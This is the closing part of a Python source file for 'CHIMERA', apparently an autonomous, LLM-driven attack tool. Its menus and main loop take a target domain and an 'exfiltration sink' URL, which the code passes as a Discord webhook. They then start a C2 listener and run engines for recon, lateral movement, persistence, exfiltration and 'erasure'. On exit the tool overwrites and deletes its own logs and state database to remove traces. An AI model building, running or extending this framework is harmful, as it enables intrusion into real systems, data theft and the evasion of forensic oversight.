def play_music():
    if not HAS_UI: return
    try:
        temp_audio = tempfile.NamedTemporaryFile(delete=False, suffix=".aac")
        temp_audio.write(base64.b64decode(AUDIO_DATA_B64))
        temp_audio.close()
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio.name)
        pygame.mixer.music.play(-1)
    except: pass

def download_model(model_idx):
    name, size, url = AI_MODELS[model_idx]
    filename = url.split('/')[-1]
    print(f"{Fore.CYAN}[*] Downloading {name} ({size})...{Style.RESET_ALL}")
    try:
        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))
        
        # Simple text-based progress bar for headless mode
        def print_progress(current, total):
            percent = (current / total) * 100
            bar_len = 30
            filled_len = int(bar_len * current // total)
            bar = '█' * filled_len + '-' * (bar_len - filled_len)
            print(f"\r[{bar}] {percent:.1f}% ({current/(1024*1024):.1f}MB / {total/(1024*1024):.1f}MB)", end="")

        with open(filename, 'wb') as f:
            if HAS_UI:
                with tqdm(desc=filename, total=total_size, unit='B', unit_scale=True, unit_divisor=1024) as bar:
                    for data in response.iter_content(chunk_size=1024*1024):
                        f.write(data)
                        bar.update(len(data))
            else:
                downloaded = 0
                for data in response.iter_content(chunk_size=1024*1024):
                    f.write(data)
                    downloaded += len(data)
                    print_progress(downloaded, total_size)
                print() # New line after progress bar
                
        print(f"{Fore.GREEN}[+] Successfully downloaded {filename}{Style.RESET_ALL}")
        time.sleep(2) # Give user time to see the success message
        return filename
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        time.sleep(3)
        return None

def safe_input(prompt: str) -> str:
    try:
        return input(prompt)
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Fore.RED}[!] Input interrupted. Exiting...{Style.RESET_ALL}")
        sys.exit(0)

def manual_setup():
    target = ""
    ports = ""
    exfil = ""
    while True:
        os.system('clear')
        print(CYAN_BANNER)
        print(f"\n{Fore.YELLOW}--- Manual Setup ---{Style.RESET_ALL}")
        print(f"1. Set Target: {Fore.GREEN}{target if target else 'Not Set'}{Style.RESET_ALL}")
        print(f"2. Set Custom Ports: {Fore.GREEN}{ports if ports else 'Default'}{Style.RESET_ALL}")
        print(f"3. Set Exfiltration Sink: {Fore.GREEN}{exfil if exfil else 'Default'}{Style.RESET_ALL}")
        print("4. Launch CHIMERA")
        print("5. Back to Main Menu")
        choice = safe_input(f"\n{Fore.CYAN}Select an option: {Style.RESET_ALL}")
        if choice == '1': target = safe_input("Enter target: ")
        elif choice == '2': ports = safe_input("Enter ports: ")
        elif choice == '3': exfil = safe_input("Enter exfil URL: ")
        elif choice == '4':
            if not target:
                print(f"{Fore.RED}[!] Set target first.{Style.RESET_ALL}")
                time.sleep(1); continue
            return {"target": target, "auto": False, "ports": ports, "exfil": exfil}
        elif choice == '5': return None

def automatic_mode():
    os.system('clear')
    print(CYAN_BANNER)
    print(f"\n{Fore.YELLOW}--- Automatic Mode ---{Style.RESET_ALL}")
    target = safe_input("Enter target: ")
    if not target: return None
    models = [f for f in os.listdir('.') if f.endswith('.gguf')]
    model_path = ""
    if models:
        print(f"\n{Fore.CYAN}[*] Found AI models: {Style.RESET_ALL}")
        for i, m in enumerate(models): print(f"{i+1}. {m}")
        m_choice = safe_input(f"\n{Fore.CYAN}Select model (or 'n'): {Style.RESET_ALL}")
        if m_choice.isdigit() and 1 <= int(m_choice) <= len(models): model_path = models[int(m_choice)-1]
    return {"target": target, "auto": True, "model": model_path}

def main_menu():
    if HAS_UI:
        init(autoreset=True)
        threading.Thread(target=play_music, daemon=True).start()
    while True:
        os.system('clear')
        print(CYAN_BANNER)
        print(f"\n{Fore.WHITE}Main Menu:{Style.RESET_ALL}")
        print("1. Manual Setup")
        print("2. Automatic Mode (AI Driven)")
        print("3. Download AI Models")
        print("4. Exit")
        choice = safe_input(f"\n{Fore.CYAN}Select an option: {Style.RESET_ALL}")
        if choice == '1':
            res = manual_setup()
            if res: return res
        elif choice == '2':
            res = automatic_mode()
            if res: return res
        elif choice == '3':
            while True:
                os.system('clear')
                print(CYAN_BANNER)
                print(f"\n{Fore.YELLOW}--- AI Models Download ---{Style.RESET_ALL}")
                for i, (name, size, _) in enumerate(AI_MODELS): 
                    print(f"{i+1:2}. {name:25} | {size}")
                print(" b. Back to Main Menu")
                m_choice = safe_input(f"\n{Fore.CYAN}Select (1-10) or 'b': {Style.RESET_ALL}")
                if m_choice.lower() == 'b': break
                if m_choice.isdigit() and 1 <= int(m_choice) <= 10: 
                    download_model(int(m_choice)-1)
        elif choice == '4': sys.exit(0)

def parse_args():
    p = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=CYAN_BANNER)
    p.add_argument("target", nargs='?', help="Root target domain")
    p.add_argument("--model", help="Path to local LLM .gguf model", default=None)
    p.add_argument("--auto", action="store_true", help="Run fully autonomous")
    p.add_argument("--exfil", help="Primary exfiltration sink URL", default=None)
    p.add_argument("--port", type=int, default=8443, help="C2 Mesh listener port")
    p.add_argument("--workspace", default="chimera_ws", help="Operational workspace directory")
    p.add_argument("--verbose", action="store_true", help="Emit debug telemetry")
    p.add_argument("--json-log", action="store_true", help="Output structured JSON telemetry")
    p.add_argument("--no-cleanup", action="store_true", help="Do NOT sanitize workspace")
    return p.parse_args()

async def main():
    if len(sys.argv) == 1:
        config = main_menu()
        class Args: pass
        args = Args()
        args.target = config['target']
        args.auto = config['auto']
        args.model = config.get('model')
        args.exfil = config.get('exfil')
        args.port = 8443
        args.workspace = "chimera_ws"
        args.verbose = False
        args.json_log = False
        args.no_cleanup = False
    else:
        args = parse_args()
        if not args.target:
            print("[-] Target required for CLI mode.")
            sys.exit(1)

    ws = Path(args.workspace)
    ws.mkdir(parents=True, exist_ok=True)

    # Initialize the Spectral Logger
    log = ChimeraLogger(ws / "chimera.log", args.verbose, args.json_log)
    await log.start()
    print(BANNER.format(v=VERSION))

    log.sys(f"CHIMERA v{VERSION} awakening...")
    log.sys(f"Hardware Topology: {_CPU_COUNT} Cores | {_RAM_GB:.1f}GB RAM")
    log.sys(f"Concurrency Matrix: Recon={MAX_CONCURRENT_RECON} Exploit={MAX_CONCURRENT_EXPLOIT} Exfil={MAX_CONCURRENT_EXFIL}")
    log.sys(f"Op Key Fingerprint: {OP_KEY.hex()[:16]}...")

    # Initialize the State Matrix (SQLite)
    state = State(ws / "state.db")
    log.ok("State Matrix initialized (WAL mode engaged)")

    # Initialize the Neural Cortex
    planner = Planner(log, args.model)

    # Initialize Operational Engines
    recon = Recon(log, state)
    c2 = C2(log, state, port=args.port)
    lateral = Lateral(log, state, c2, recon)
    persistence = Persistence(log, state, c2)
    exfil = Exfiltrator(log, state, c2, {"discord_webhook": args.exfil} if args.exfil else None)
    erasure = Erasure(log, state, c2)

    # Start the C2 Mesh Listener
    await c2.serve()

    # Operator Confirmation Gate
    if not args.auto:
        log.wrn("Autonomous mode is DISENGAGED. Press ENTER to engage Autopilot or CTRL+C to abort.")
        try:
            await asyncio.get_event_loop().run_in_executor(None, input)
        except asyncio.CancelledError:
            pass

    # Initialize the Autopilot
    autopilot = Autopilot(log, state, planner, recon, c2, lateral, persistence, exfil, erasure, args.target)

    # Signal handling for graceful self-destruction
    shutdown_triggered = asyncio.Event()

    def _signal_handler(sig, frame):
        log.wrn(f"Signal {sig} intercepted. Engaging emergency self-destruct sequence...")
        shutdown_triggered.set()

    try:
        signal.signal(signal.SIGINT, _signal_handler)
        signal.signal(signal.SIGTERM, _signal_handler)
    except (OSError, ValueError):
        pass

    try:
        autopilot_task = asyncio.create_task(autopilot.run())
        # Wrap the event wait in a task to avoid "Passing coroutines is forbidden" in Python 3.11+
        shutdown_task = asyncio.create_task(shutdown_triggered.wait())
        
        done, pending = await asyncio.wait(
            {autopilot_task, shutdown_task},
            return_when=asyncio.FIRST_COMPLETED
        )
        
        # Cleanup tasks
        for t in pending:
            t.cancel()
            
        if shutdown_triggered.is_set():
            autopilot.running = False
            try:
                # Ensure we wait for the autopilot task to finish its cleanup
                await asyncio.wait_for(asyncio.shield(autopilot_task), timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                autopilot_task.cancel()
    except Exception as e:
        log.err(f"Critical Autopilot failure: {e}")
        traceback.print_exc()
    finally:
        log.sys("Initiating operational shutdown sequence...")
        await c2.stop()
        await log.stop()

        if not args.no_cleanup:
            log.sys("Sanitizing workspace artifacts...")
            try:
                db_path = ws / "state.db"
                if db_path.exists():
                    size = os.path.getsize(db_path)
                    with open(db_path, "wb") as f:
                        f.write(secrets.token_bytes(size))
                    os.remove(db_path)
                for ext in ["-wal", "-shm"]:
                    p = Path(str(db_path) + ext)
                    if p.exists(): os.remove(p)
                log_path = ws / "chimera.log"
                if log_path.exists():
                    size = os.path.getsize(log_path)
                    with open(log_path, "wb") as f:
                        f.write(secrets.token_bytes(size))
                    os.remove(log_path)
                try:
                    os.rmdir(ws)
                except OSError:
                    pass
                print(f"\033[90m[-] Workspace sanitized.\033[0m")
            except Exception as e:
                print(f"\033[31m[!] Workspace sanitization failed: {e}\033[0m")
        else:
            print(f"\033[33m[!] Workspace preserved at: {ws}\033[0m")

        print(BANNER.format(v=VERSION))
        print("\033[95m⚑ CHIMERA has vanished from the network. ⚑\033[0m")


if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
